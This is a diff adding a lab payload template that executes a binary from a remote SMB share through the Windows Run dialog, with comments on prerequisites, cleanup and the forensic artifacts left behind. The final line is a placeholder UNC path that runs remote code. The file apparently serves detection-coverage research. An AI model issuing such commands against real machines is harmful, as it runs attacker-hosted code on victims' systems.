@@ -1,0 +1,25 @@
+# TEMPLATE: unc-001
+# CLASS: plain UNC exe execution (staged, Run dialog, no LOLBin wrapper)
+# AUTHORIZATION: Authorized lab security research only — see payloads/README.md.
+#   SMB_HOST must be a lab placeholder (RFC1918 10.x, example-only).
+# PURPOSE: Shortest possible kill-chain step: the Run dialog will
+#   ShellExecute a binary located on a remote share directly. No download,
+#   no wrapper process, no chaining — this is the minimal keystroke count
+#   baseline for the staged family and the control template for comparing
+#   LOLBin-wrapper detection coverage against.
+# PREREQUISITES: SMB (TCP 445) from the target VM to SMB_HOST reachable;
+#   SMB_SHARE readable; EXE_NAME is a lab-built benign binary. Local admin
+#   not required unless the binary itself demands elevation (no UAC prompt
+#   is raised by the UNC path itself for a standard user-launched exe).
+# CLEANUP: Stop the spawned process; clear Run MRU; close the SMB session
+#   (net use /delete \\<SMB_HOST>\... if a session was established).
+# ARTIFACT: Process: EXE_NAME running with image path on the remote share
+#   (network image path visible in process tooling / EDR telemetry).
+# ARTIFACT: Network: SMB2 read of the binary from SMB_HOST over TCP 445.
+# ARTIFACT: Registry: RunMRU value contains the full UNC path command.
+# ARTIFACT: Prefetch: prefetch record for the remote-image binary
+#   references the UNC path if prefetch enabled.
+# ARTIFACT: Console: flash of a console window if EXE_NAME is a console
+#   binary and no mitigation redirects it.
+# ---
+\\<SMB_HOST>\<SMB_SHARE>\<EXE_NAME>
